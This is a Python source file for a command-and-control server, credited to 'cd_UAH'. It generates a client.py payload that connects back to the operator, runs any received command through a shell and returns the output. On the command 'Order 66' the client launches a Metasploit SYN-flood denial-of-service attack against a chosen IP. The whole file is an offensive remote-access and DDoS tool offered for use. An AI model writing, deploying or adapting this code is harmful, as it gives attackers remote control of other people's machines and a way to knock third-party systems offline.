import socket
import subprocess
import sys
import os
import psutil
from threading import Thread




def get_public_ip():
    try:
        from requests import get
        return get('https://api.ipify.org').text
    except ImportError:
        print("requests library not found, please install it by running 'pip install requests'")
        sys.exit(1)




def get_local_ip():
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET and iface.lower().startswith('wi-fi'):
                return addr.address
    return None




def send_command(client_socket, command):
    client_socket.sendall(command.encode('utf-8'))




def handle_client(client_socket):
    response_thread = Thread(target=handle_response, args=(client_socket,))
    response_thread.daemon = True
    response_thread.start()


    while True:
        command = input(">> ")
        if not command:
            break


        if command == "exit":
            break


        send_command_thread = Thread(target=send_command, args=(client_socket, command))
        send_command_thread.start()

def handle_response(client_socket):
    while True:
        response = client_socket.recv(1024).decode('utf-8')
        if not response:
            break


        print(response)


    client_socket.close()

def print_frog_ascii():
    print("C2 SERVER")
    print("""
Created by cd_UAH
------------------------------------------------------------
    """)




def main():
    print_frog_ascii()
    print("1. Type 1 to start listening")
    print("2. Type 2 to spawn a client and start listening")


    choice = input(">> ")
    if choice == "1":
        start_listening()
    elif choice == "2":
        local_ip = '192.168.100.7' #get_local_ip()
        if local_ip is None:
            print("Wi-Fi adapter not found. Please make sure it is connected and try again.")
            sys.exit(1)
        public_ip = get_public_ip()


        print("Local IP: ", local_ip)
        print("Public IP: ", public_ip)


        client_template = '''
import socket
import subprocess


def execute_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        stdout = stdout.decode('utf-8').strip()
        stderr = stderr.decode('utf-8').strip()
        return stdout + stderr
    except Exception as e:
        return str(e).encode('utf-8')


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{server_ip}", 5555))
except socket.error:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{local_ip}", 5555))


def ddos():
    print("Creating BASH script")  # create the DDoS bash script to run metasploit
    file = open('execute.sh', 'w')
    file.write('#!/bin/bash'
               )
    file.close()
    print("File created as execute.sh")
    print("Executing execute.sh to initiate DDoS")
    subprocess.call('./execute.sh')


while True:
    print("Command received from server")  # verify command recieved
    command = s.recv(1024).decode('utf-8')
    if not command or command == "exit":
        break
    print("[Server said]  ", command)
    if command == "IP":  # sets the target IP of the DDoS
        tarIP = input("Enter the target IP as: xxx.xxx.xxx.xxx: ")
        #tarIP = s.recv(1024).decode('utf-8')
        print("Target IP set as:", tarIP, "waiting for execution command")
        f = open('execute.sh', 'a') 
        f.write('msfconsole -q -x "use auxiliary/dos/tcp/synflood; set RHOST {tarIP}; exploit"')
        f.close()
    if command == "Order 66":  # execution code
        print("EXECUTING ORDER 66 STANDBY")
        ddos()

    response = execute_command(command)
    s.sendall(response.encode('utf-8'))

s.close()
'''


        with open('client.py', 'w') as client_file:
            client_file.write(client_template.format(server_ip=public_ip, local_ip=local_ip, tarIP=0))


        print("Client file created as 'client.py'")
        print("Run the file on the client machine to connect to the C2 server.")
        start_listening()




def start_listening():
    local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    local_socket.bind(('0.0.0.0', 5555))
    local_socket.listen(1)


    print("Server is listening on port 5555...")
    client, addr = local_socket.accept()
    print(f"Connection established with {addr[0]}:{addr[1]}")
    handle_client(client)




if __name__ == '__main__':
    main() 